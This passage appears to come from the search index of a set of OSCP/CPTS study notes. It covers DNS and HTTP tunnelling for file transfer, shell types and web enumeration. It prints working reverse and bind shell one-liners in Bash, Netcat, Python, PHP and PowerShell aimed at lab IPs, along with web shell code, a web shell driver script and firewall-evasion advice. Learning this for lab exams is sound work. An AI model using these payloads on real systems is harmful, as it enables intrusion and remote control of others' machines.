<li>Extract the downloaded <code>.zip</code> file. You should see the <code>iodine.exe</code> file.</li> </ul> </li> </ol>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#step-3-establish-the-dns-tunnel","title":"Step 3: Establish the DNS Tunnel","text":"<ol> <li> <p>Run the Iodine Client on Windows:</p> <ul> <li> <p>Open Command Prompt (as Administrator) on the target Windows machine.</p> </li> <li> <p>Navigate to the folder where you extracted <code>iodine.exe</code>.</p> </li> <li> <p>Use the following command to establish the DNS tunnel with your attacker machine:</p> <pre><code>iodine.exe -f &lt;your_public_ip&gt; tunnel.example.com\n</code></pre> </li> </ul> <p>Here:</p> <ul> <li><code>&lt;your_public_ip&gt;</code> is your attacker's public IP address (where the Iodine server is running).</li> <li><code>tunnel.example.com</code> is the DNS domain or subdomain pointing to your attacker\u2019s IP (same as in the Linux example).<ol> <li>Verify the Tunnel Interface: Once the DNS tunnel is established, you can check the network interfaces on the target Windows machine to see the virtual interface that gets created (like <code>dns0</code> in Linux). Run this in Command Prompt:</li> </ol> </li> </ul> <pre><code>ipconfig /all\n</code></pre> <p>You should see a new interface with an IP address like <code>10.0.0.2</code> assigned (assuming your Iodine server on the attacker machine is set to <code>10.0.0.1</code>).</p> </li> </ol>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#step-4-transfer-files-over-the-dns-tunnel","title":"Step 4: Transfer Files Over the DNS Tunnel","text":"<p>Now that the DNS tunnel is active, you can use it to transfer files from your attacker machine to the Windows target. You can do this with standard tools like Netcat (nc) or PowerShell, or using the scp command if SSH is available.</p> <p>Here are two examples for file transfer:</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#option-1-transfer-files-using-netcat-nc","title":"Option 1: Transfer Files Using Netcat (nc)","text":"<p>You can use Netcat over the DNS tunnel to transfer files between the machines.</p> <ol> <li> <p>On the Attacker Machine: Start a listener to send a file via Netcat:</p> <pre><code>nc -lvnp 4444 &lt; /path/to/file\n</code></pre> </li> <li> <p>On the Target (Windows) Machine: Use Netcat to receive the file:</p> <pre><code>nc 10.0.0.1 4444 &gt; C:\\\\path\\\\to\\\\outputfile\n</code></pre> <p>Here, <code>10.0.0.1</code> is the IP of the attacker\u2019s machine through the DNS tunnel.</p> </li> </ol>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#option-2-transfer-files-using-powershell","title":"Option 2: Transfer Files Using PowerShell","text":"<p>You can use PowerShell to download files directly from your attacker machine over HTTP (assuming you have set up a Python HTTP server on your attacker machine, similar to the original example):</p> <ol> <li> <p>On the Attacker Machine: Start a Python HTTP server:</p> <pre><code>python3 -m http.server 8000\n</code></pre> </li> <li> <p>On the Target (Windows) Machine: Use PowerShell to download the file from the attacker machine:</p> <pre><code>Invoke-WebRequest -Uri &lt;http://10.0.0.1:8000/file.txt&gt; -OutFile C:\\\\path\\\\to\\\\outputfile.txt\n</code></pre> <p>Again, <code>10.0.0.1</code> is the IP of the attacker\u2019s machine in the DNS tunnel, and this will download <code>file.txt</code> from the attacker's HTTP server.</p> </li> </ol>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#step-5-validate-file-transfer","title":"Step 5: Validate File Transfer","text":"<p>After transferring files, you can verify their integrity by checking their hashes on both machines.</p> <ul> <li> <p>On the Attacker Machine:</p> <p>```bash        md5sum /path/to/file</p> <p>```</p> </li> <li> <p>On the Target (Windows) Machine: Use the CertUtil command to compute the file\u2019s hash:</p> <pre><code>certutil -hashfile C:\\\\path\\\\to\\\\outputfile MD5\n</code></pre> </li> </ul> <p>The output hashes should match, confirming the file was transferred correctly.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#summary_1","title":"Summary","text":"<ul> <li>Windows Target: Use the Iodine Windows client to establish a DNS tunnel with your attacker machine.</li> <li>File Transfer: Use Netcat, PowerShell, or other tools to transfer files over the established DNS tunnel.</li> </ul> <p>This method bypasses traditional firewalls and security measures that block common file transfer methods but allow DNS traffic.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#http-tunneling","title":"HTTP Tunneling","text":"<p>HTTP tunneling allows you to encapsulate non-HTTP traffic (like file transfers) inside HTTP requests. This is useful for environments where outbound web traffic (HTTP/HTTPS) is allowed, but other forms of traffic are blocked by firewalls.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#steps-for-http-tunneling","title":"Steps for HTTP Tunneling:","text":"<ol> <li> <p>Set up an HTTP tunneling tool on the attacker machine:</p> <ul> <li>Use tools like HTTPTunnel, Chisel, or Tunna to create an HTTP tunnel server.</li> </ul> <p>Example using Chisel:</p> <ul> <li> <p>On the attacker's machine:</p> <pre><code>sudo apt-get install chisel\n./chisel server -p 8080 --reverse\n</code></pre> <p>This starts a chisel server listening on port 8080, ready to accept incoming reverse tunnels.</p> </li> </ul> </li> <li> <p>Set up the HTTP tunnel client on the target machine:</p> <ul> <li> <p>On the target machine (if you have shell access), set up the reverse connection to the attacker's server:</p> <pre><code>bash\nCopy code\n./chisel client &lt;http://10.10.14.1:8080&gt; R:8081:localhost:22\n</code></pre> <p>This command creates a reverse tunnel through HTTP. The <code>R:8081:localhost:22</code> part means that port 8081 on the attacker's machine is forwarded to port 22 (SSH) on the target. You can change the port or service depending on what you need to tunnel.</p> </li> </ul> </li> <li> <p>Transfer files through the HTTP tunnel:</p> <ul> <li> <p>Now that you have an HTTP tunnel, you can transfer files through the tunneled connection using standard tools:</p> <pre><code>bash\nCopy code\nscp -P 8081 user@localhost:/path/to/file .\n</code></pre> <p>The HTTP tunnel will forward the request to the target machine, allowing file transfer despite the firewall.</p> </li> </ul> </li> </ol>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#tools-for-http-tunneling","title":"Tools for HTTP Tunneling:","text":"<ul> <li>HTTPTunnel: Allows you to tunnel any TCP connection through an HTTP proxy.</li> <li>Chisel: Fast TCP/UDP tunneling over HTTP, great for tunneling services like SSH.</li> <li>Tunna: A web application that creates a tunnel using HTTP requests.</li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#when-to-use-dns-or-http-tunneling","title":"When to Use DNS or HTTP Tunneling","text":"<ul> <li>DNS tunneling: Useful when DNS traffic is allowed but other outbound traffic is blocked. DNS queries are often overlooked by firewalls.</li> <li>HTTP tunneling: Useful in environments where only web traffic is allowed. HTTP requests can encapsulate other protocols like SSH or SCP for file transfers.</li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#study-tips","title":"Study Tips","text":"<ul> <li>Practice using tunneling tools in different scenarios, especially in environments with restricted outbound traffic.</li> <li>Set up a lab environment to practice file transfers over DNS or HTTP tunneling, and simulate firewall rules to understand how these methods can bypass them.</li> <li>Master encoding techniques such as Base64 encoding and scripting the process of sending chunks of data, as they are essential when file transfer is blocked.</li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#study-tip","title":"Study Tip","text":"<ul> <li>For real-world situations and exams, always be prepared to handle scenarios where direct file transfer methods are blocked. Practice breaking down encoded data into chunks or manually transferring data as a fallback method when copy-paste isn't available.</li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#validating-file-transfers","title":"Validating File Transfers","text":"<p>After transferring a file, it\u2019s important to verify its integrity and format.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#1-using-the-file-command","title":"1. Using the <code>file</code> Command:","text":"<p>Check the file type on the remote host to confirm it was transferred correctly.</p> <pre><code>file output_file\n</code></pre>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#2-using-md5sum","title":"2. Using <code>md5sum</code>:","text":"<p>Compare the file\u2019s MD5 hash on both machines to ensure it was transferred without corruption.</p> <ul> <li> <p>On the attack machine:</p> <pre><code>md5sum filename\n</code></pre> </li> <li> <p>On the remote host:</p> <pre><code>md5sum output_file\n</code></pre> </li> </ul> <p>If both MD5 hashes match, the file was transferred correctly.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#study-tips_1","title":"Study Tips","text":"<ul> <li>Practice: Set up a virtual lab environment with multiple virtual machines (VMs) and practice transferring files using the different methods mentioned.</li> <li>Key Commands: Memorize key commands for each file transfer method. Knowing the options for <code>scp</code>, <code>wget</code>, <code>curl</code>, and <code>base64</code> will help you in both exams and real-world situations.</li> <li>Verify Integrity: Always practice using <code>md5sum</code> or other hashing algorithms (like <code>sha256sum</code>) to ensure file integrity after transferring files.</li> <li>Firewall Evasion: Focus on learning methods like <code>base64</code> encoding to bypass firewall restrictions, as this is often tested in exams and is practical in real-life scenarios.</li> <li>Efficiency: Try to use the quickest and least intrusive method for file transfers based on the situation (e.g., <code>wget</code> or <code>curl</code> if ports are open).</li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Types%20of%20Shells/","title":"Types of Shells","text":"","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Types%20of%20Shells/#references","title":"References","text":"<ul> <li>Example Tutorial</li> <li>OSCP Exploit Documentation</li> </ul> <p>During the OSCP exam, one of the key tasks is gaining control of compromised systems through various types of shells. These shells allow us to interact with the system for enumeration, further exploitation, and privilege escalation. There are three main types of shells: Reverse Shell, Bind Shell, and Web Shell. Each has a different way of communicating with the attacker\u2019s machine, and knowing when and how to use each type is critical.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Types%20of%20Shells/#shell-types-and-communication-methods","title":"Shell Types and Communication Methods","text":"Shell Type Communication Method Reverse Shell The compromised host connects back to the attacker\u2019s machine (initiates the connection). Bind Shell The attacker connects to the compromised host\u2019s listening shell. Web Shell The attacker sends commands via web requests (HTTP GET/POST) through a web interface.","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Types%20of%20Shells/#reverse-shell","title":"Reverse Shell","text":"<p>A Reverse Shell connects from the victim\u2019s machine back to your attacking machine, giving you control. This is often the most commonly used method since it avoids the need for the attacker to initiate the connection, which can sometimes be blocked by firewalls.</p> <p>Steps for Reverse Shell:</p> <ol> <li>Start a listener (e.g., using <code>netcat</code> or <code>Metasploit</code>) on your machine.</li> <li>Execute a reverse shell payload on the target system.</li> <li>Once the connection is established, you have control over the system.</li> </ol> <p>Starting a Netcat Listener (Attacker Machine):</p> <pre><code>nc -lvnp 1234\n</code></pre> <ul> <li><code>l</code>: Listen for incoming connections.</li> <li><code>v</code>: Verbose mode, show connection details.</li> <li><code>n</code>: No DNS resolution, faster connection.</li> <li><code>p 1234</code>: Listen on port 1234.</li> </ul> <p>Finding Your IP (Attacker Machine):</p> <pre><code>ip a\n</code></pre> <p>Look for the <code>tun0</code> or <code>eth0</code> interface, depending on the network you're on (e.g., VPN or direct).</p> <p>Common Reverse Shell Commands:</p> <ul> <li> <p>Bash (Linux):</p> <pre><code>bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1\n</code></pre> <pre><code>/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1'\n</code></pre> </li> <li> <p>Netcat (Linux):</p> <pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.10.10 1234 &gt;/tmp/f\n</code></pre> <pre><code>nc -e /bin/bash 10.10.10.10 1234\n</code></pre> </li> <li> <p>Python (Linux):     <pre><code>python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.10\",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'</code></pre></p> </li> <li> <p>PHP (Linux):</p> <pre><code>php -r '$sock=fsockopen(\"10.10.10.10\",1234);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'\n</code></pre> </li> <li> <p>PowerShell (Windows):</p> <p><pre><code>powershell\npowershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient(\"10.10.10.10\",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object -TypeName Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2&gt;&amp;1 | Out-String);$sendback2 = $sendback + \"PS \" + (pwd).Path + \"&gt; \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</code></pre></p> </li> </ul> <p>Reverse Shell over HTTPS: This is useful if HTTP traffic is blocked, but HTTPS is open.</p> <ul> <li> <p>Bash (Linux):</p> <p><pre><code>bash\nbash -c \"exec 5&lt;&gt;/dev/tcp/10.10.10.10/443;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done\"</code></pre></p> </li> </ul> <p>Once the reverse shell is executed, the listener (Netcat or Metasploit) will show a connection, and you can interact with the compromised system.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Types%20of%20Shells/#bind-shell","title":"Bind Shell","text":"<p>A Bind Shell sets up a listener on the compromised machine, and the attacker connects to it. Bind shells are less common because firewalls often block inbound connections, but they can be useful in certain scenarios.</p> <p>Steps for Bind Shell:</p> <ol> <li>Execute a bind shell payload on the compromised system.</li> <li>Connect to the target machine\u2019s open port with <code>netcat</code>.</li> </ol> <p>Bind Shell Commands:</p> <ul> <li> <p>Bash (Linux):</p> <p><pre><code>bash\nnc -lvnp 1234 -e /bin/bash</code></pre></p> <p><pre><code>bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc -lvp 1234 &gt;/tmp/f</code></pre></p> </li> <li> <p>Python (Linux):</p> <p><pre><code>python\npython -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"0.0.0.0\",1234));s.listen(1);conn,addr=s.accept();while True: data=conn.recv(1024);if not data: break;p=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE);conn.sendall(p.stdout.read()+p.stderr.read())'</code></pre></p> </li> <li> <p>PowerShell (Windows):</p> <p><pre><code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]::new(1234);$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$buffer = 0..65535|%{0};while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){$data = (New-Object -TypeName Text.ASCIIEncoding).GetString($buffer,0,$i);$sendback = (iex $data 2&gt;&amp;1 | Out-String);$sendback2 = $sendback + \"PS \" + (pwd).Path + \"&gt; \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</code></pre></p> </li> </ul> <p>Once the bind shell command is executed, use <code>nc</code> or a browser to connect to the open port on the target machine.</p> <p>Connecting to Bind Shell:</p> <pre>```bash\nnc 10.10.10.1 1234\n```</pre>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Types%20of%20Shells/#upgrading-shells-reverse-or-bind","title":"Upgrading Shells (Reverse or Bind)","text":"<p>Often, shells obtained through Netcat or other tools are non-interactive. To make the shell interactive, upgrade it to a proper TTY.</p> <p>Steps to Upgrade Shell:</p> <ol> <li> <p>Use Python to spawn a TTY:</p> <p><pre><code>bash\npython -c 'import pty; pty.spawn(\"/bin/bash\")'</code></pre></p> </li> <li> <p>Background the shell with <code>Ctrl+Z</code>, then:</p> <p><pre><code>bash\nstty raw -echo\nfg\nreset\nexport TERM=xterm-256color\nstty rows 67 columns 318</code></pre></p> </li> </ol> <p>If Python is not available, alternatives include:</p> <ul> <li> <p>Perl TTY upgrade:</p> <p><pre><code>perl\nperl -e 'exec \"/bin/sh\";'</code></pre></p> </li> <li> <p>Echoing a new terminal:</p> <p><pre><code>bash\necho os.system('/bin/bash')</code></pre></p> </li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Types%20of%20Shells/#web-shell","title":"Web Shell","text":"<p>A Web Shell allows you to execute commands on the target server through a web interface, typically via GET or POST requests. This is useful when exploiting file upload vulnerabilities or injecting into a web directory.</p> <p>PHP Web Shell (Linux):</p> <pre>```php\n\n```</pre> <p>ASP Web Shell (Windows):</p> <pre>```\n&lt;% eval request(\"cmd\") %&gt;\n```</pre> <p>JSP Web Shell:</p> <pre>```\n&lt;%= Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %&gt;\n```</pre> <p>Uploading a Web Shell:</p> <ol> <li> <p>Exploit file upload functionality or remote code execution.</p> </li> <li> <p>Place the web shell in the webroot directory (e.g., <code>/var/www/html/</code>).</p> <p><pre><code>bash\necho '&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; /var/www/html/shell.php</code></pre></p> </li> </ol> <p>Accessing the Web Shell: You can access it using a browser or with <code>curl</code>:</p> <ul> <li> <p>Browser:</p> <p><pre>\n<code>&lt;http://10.10.10.10/shell.php?cmd=id&gt;</code></pre></p> </li> <li> <p><code>curl</code>:</p> <p><pre>```bash\ncurl http://10.10.10.10/shell.php?cmd=id\n<p>```</p>\n\n\n\n<p>In scenarios where firewalls block traditional reverse or bind shells. By leveraging the existing web traffic and ports (typically <code>80</code> or <code>443</code>), web shells can bypass restrictions, and persistence is a bonus since they remain accessible after system reboots.</p>\n<p>However, as you mentioned, one downside is the lack of interactivity. Since each command must be requested via a new URL (usually through GET or POST requests), it can be slow and tedious. To mitigate this, automation scripts can be used to send commands more efficiently and simulate an interactive shell experience. Here's an example of a simple Python script that can automate this process and provide semi-interactive access to a web shell.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Types%20of%20Shells/#automating-web-shell-commands-with-python","title":"Automating Web Shell Commands with Python","text":"<p>The following Python script automates sending commands to a web shell through HTTP requests and prints the output in a semi-interactive manner. This makes using the web shell more manageable from a terminal.</p>\n<p>Python Script for Semi-Interactive Web Shell:</p>\n<pre><code>import requests\n\n# Set the URL of the web shell\nurl = \"http://SERVER_IP:PORT/shell.php\"\n\n# Infinite loop for continuous command input\nwhile True:\n    # Prompt user for command input\n    cmd = input(\"Shell&gt; \")\n\n    # Exit if the user types 'exit'\n    if cmd.lower() == \"exit\":\n        break\n\n    # Send the command via GET request\n    response = requests.get(url, params={\"cmd\": cmd})\n\n    # Print the output from the server\n    print(response.text)\n</code></pre>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Types%20of%20Shells/#how-it-works","title":"How It Works:","text":"<ol>\n<li>URL Definition: The script points to the URL where the web shell is hosted.</li>\n<li>Command Input: It continuously prompts the user for input.</li>\n<li>Sending Command: It sends the command as a parameter (<code>cmd</code>) via a GET request to the web shell.</li>\n<li>Output Display: The response from the server (command execution result) is displayed in the terminal.</li>\n<li>Exit Command: Typing <code>exit</code> breaks the loop and closes the shell.</li>\n</ol>\n<p>You can save this script as <code>web_shell.py</code> and run it in your terminal:</p>\n<pre>\n<pre><code>python3 web_shell.py\n</code></pre>\n</pre>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Types%20of%20Shells/#handling-edge-cases","title":"Handling Edge Cases","text":"<ul>\n<li>\n<p>Handling POST Requests: If the web shell uses POST instead of GET, modify the script to send data in the request body:</p>\n<p><pre><code>python\nresponse = requests.post(url, data={\"cmd\": cmd})</code>\n</pre></p>\n</li>\n<li>\n<p>Handling Different Response Formats: If the response from the server contains HTML or other unnecessary formatting, you can clean it up before printing the output. For example, using BeautifulSoup to strip tags:</p>\n<p><pre>\n<pre><code>from bs4 import BeautifulSoup\nresponse = requests.get(url, params={\"cmd\": cmd})\nsoup = BeautifulSoup(response.text, 'html.parser')\nprint(soup.get_text())\n</code></pre>\n</pre></p>\n</li>\n</ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Types%20of%20Shells/#pros-and-cons-of-using-a-web-shell","title":"Pros and Cons of Using a Web Shell","text":"","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Types%20of%20Shells/#pros","title":"Pros:","text":"<ul>\n<li>Firewall Evasion: Since web shells use HTTP or HTTPS, they bypass most firewall rules that block traditional shells.</li>\n<li>Persistence: The web shell remains functional even after the target system is rebooted unless the web server or files are changed.</li>\n<li>No New Ports Opened: Operates over existing web traffic ports (e.g., 80 or 443), reducing detection chances.</li>\n</ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Types%20of%20Shells/#cons","title":"Cons:","text":"<ul>\n<li>Lack of Interactivity: Web shells are not as interactive as reverse or bind shells, requiring multiple requests for each command.</li>\n<li>Slower Operation: Each command needs a separate HTTP request, adding overhead.</li>\n<li>Limited Control: The range of commands and capabilities can be limited depending on the permissions of the web server user (usually <code>www-data</code> on Linux).</li>\n</ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Types%20of%20Shells/#summary-of-key-commands","title":"Summary of Key Commands","text":"Shell Type\nCommand (Linux)\nCommand (Windows)\n\n\n\n\nReverse Bash\n<code>bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1</code>\n\n\n\nReverse Netcat\n<code>nc -e /bin/bash 10.10.10.10 1234</code>\n\n\n\nReverse PowerShell\n\n<code>powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient...\"</code>\n\n\nBind Bash\n<code>nc -lvnp 1234 -e /bin/bash</code>\n\n\n\nBind PowerShell\n\n<code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener =...</code>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Way%20Forward/","title":"Way Forward","text":"","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Way%20Forward/#references","title":"References","text":"<ul> <li>Example Tutorial</li> <li>OSCP Exploit Documentation</li> </ul> <p>After finishing all of the above, there are still many other checkboxes that we need to complete to keep learning, and\u00a0<code>Hack The Box</code>\u00a0is full of learning opportunities. Here are some ideas:</p> <ul> <li>[ ] Root a Retired Easy Box</li> <li>[ ] Root a Retired Medium Box</li> <li>[ ] Root an Active Box</li> <li>[ ] Complete an Easy Challenge</li> <li>[ ] Share a Walkthrough of a Retired Box</li> <li>[ ] Complete Offensive Academy Modules</li> <li>[ ] Root Live Medium/Hard Boxes</li> <li>[ ] Complete A Track</li> <li>[ ] Win a\u00a0<code>Hack The Box Battlegrounds</code>\u00a0Battle</li> <li>[ ] Complete A Pro Lab</li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Web%20Enumeration%20Overview/","title":"Web Enumeration Overview","text":"","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Web%20Enumeration%20Overview/#references","title":"References","text":"<ul> <li>Example Tutorial</li> <li>OSCP Exploit Documentation</li> </ul> <p>When scanning web services on common ports (80, 443), web servers hosting applications provide a significant attack surface. A web server may contain hidden directories, subdomains, or exposed sensitive data that could be leveraged for vulnerabilities like remote code execution (RCE). Proper web enumeration is critical, especially for well-secured environments.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Web%20Enumeration%20Overview/#directory-enumeration-with-gobuster","title":"Directory Enumeration with Gobuster","text":"<ul> <li>Tool: <code>Gobuster</code> is used for directory brute-forcing to uncover hidden files or directories on a web server. It can also perform DNS and vhost enumeration.</li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Web%20Enumeration%20Overview/#gobuster-command","title":"Gobuster Command:","text":"<pre><code>gobuster dir -u &lt;http://10.10.10.121/&gt; -w /usr/share/seclists/Discovery/Web-Content/common.txt\n</code></pre> <ul> <li> <p><code>u &lt;URL&gt;</code>: Specifies the target URL.</p> </li> <li> <p><code>w &lt;wordlist&gt;</code>: Uses a wordlist (<code>common.txt</code> in this case) for directory brute-forcing.</p> </li> <li> <p>Output Example:</p> <pre><code>/htpasswd (Status: 403)\n/index.php (Status: 200)\n/server-status (Status: 403)\n/wordpress (Status: 301)\n</code></pre> <ul> <li>200: Resource request was successful.</li> <li>301: Indicates redirection.</li> <li>403: Access forbidden.</li> <li>Key Result: The WordPress installation at <code>/wordpress</code> is revealed, which can be explored further.</li> </ul> </li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Web%20Enumeration%20Overview/#subdomain-enumeration-with-gobuster","title":"Subdomain Enumeration with Gobuster","text":"<p>DNS Subdomain Enumeration: Subdomains may host valuable services like admin panels. <code>Gobuster</code> can be used to enumerate subdomains using the dns mode.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Web%20Enumeration%20Overview/#gobuster-dns-command","title":"Gobuster DNS Command:","text":"<pre><code>gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt\n</code></pre> <ul> <li> <p><code>d &lt;domain&gt;</code>: Specifies the target domain.</p> </li> <li> <p>Output Example:</p> <pre><code>Found: blog.inlanefreight.com\nFound: customer.inlanefreight.com\n</code></pre> </li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Web%20Enumeration%20Overview/#banner-grabbing-web-server-headers","title":"Banner Grabbing &amp; Web Server Headers","text":"<ul> <li> <p>Banner grabbing helps in identifying server details (e.g., the server software, version, etc.).</p> </li> <li> <p>Command to Grab Web Server Headers:</p> <pre><code>curl -IL &lt;https://www.inlanefreight.com&gt;\n</code></pre> <ul> <li> <p>Output might include:</p> <pre><code>Server: Apache/2.4.29 (Ubuntu)\nLink: &lt;https://www.inlanefreight.com/index.php/wp-json/&gt;\n</code></pre> </li> </ul> </li> <li> <p>Tip: Use tools like <code>curl</code> to get server headers, which can reveal configuration details.</p> </li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Web%20Enumeration%20Overview/#web-technologies-service-discovery-with-whatweb","title":"Web Technologies &amp; Service Discovery with WhatWeb","text":"<ul> <li>WhatWeb helps identify web technologies, servers, frameworks, and other information useful for vulnerability discovery.</li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Web%20Enumeration%20Overview/#whatweb-command","title":"WhatWeb Command:","text":"<pre><code>whatweb &lt;http://10.10.10.121&gt;\n</code></pre> <ul> <li> <p>Output Example:</p> <pre><code>&lt;http://10.10.10.121&gt; [200 OK] Apache[2.4.41], Title[PHP 7.4.3 - phpinfo()]\n</code></pre> </li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Web%20Enumeration%20Overview/#ssltls-certificates","title":"SSL/TLS Certificates","text":"<ul> <li>HTTPS services often use SSL/TLS certificates, which may contain information like email addresses or company details. Browsing an HTTPS URL and viewing its certificate can help gather additional details useful for attacks like phishing.</li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Web%20Enumeration%20Overview/#robotstxt","title":"Robots.txt","text":"<ul> <li>Purpose: Instructs web crawlers on what should not be indexed.</li> <li>Tip: Checking the <code>robots.txt</code> file may reveal disallowed entries, such as private or admin directories. These can often provide access to sensitive resources.</li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Web%20Enumeration%20Overview/#source-code-review","title":"Source Code Review","text":"<ul> <li>Tip: Always check the source code of web pages for developer comments, hardcoded credentials, or other sensitive information. For example, pressing <code>CTRL + U</code> in a browser reveals the page source.</li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Web%20Enumeration%20Overview/#tools-summary","title":"Tools Summary:","text":"<ul> <li>Gobuster: Directory and subdomain enumeration.</li> <li>Curl: Banner grabbing and HTTP server headers.</li> <li>WhatWeb: Web technology and service discovery.</li> <li>EyeWitness: Screenshots and fingerprinting for web applications.</li> <li>SecLists: Wordlists for fuzzing and brute-forcing.</li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Info%20Gathering%20Web%20Edition/Penetration%20Testing%20Process/","title":"Penetration Testing Process","text":"<p>[!tip]- Tips Write tips here</p>"},{"location":"CPTS/Info%20Gathering%20Web%20Edition/Penetration%20Testing%20Process/#references","title":"References","text":"<ul> <li>Layered Enumeration Framework Guide</li> <li>Comprehensive OSCP Enumeration Strategies</li> </ul>"},{"location":"CPTS/Info%20Gathering%20Web%20Edition/Penetration%20Testing%20Process/#penetration-testing-process","title":"Penetration Testing Process","text":"<p>![[Pasted image 20241116003902.png]] - Pre-Engagement - Information Gathering - Vulnerability Assessment - Exploitation - Post-Exploitation - Lateral Movement - Proof of Concept - Post Engagement</p> <ol> <li> <p>Pre-Engagement:     This is the planning stage, where the scope, rules of engagement, and objectives are defined. Communication between the client and the tester ensures that expectations are aligned.</p> </li> <li> <p>Information Gathering:     The tester collects as much data as possible about the target, such as IP addresses, domains, email addresses, public records, and exposed technologies. This can involve passive reconnaissance (e.g., OSINT) or active scanning.</p> </li> <li> <p>Vulnerability Assessment:     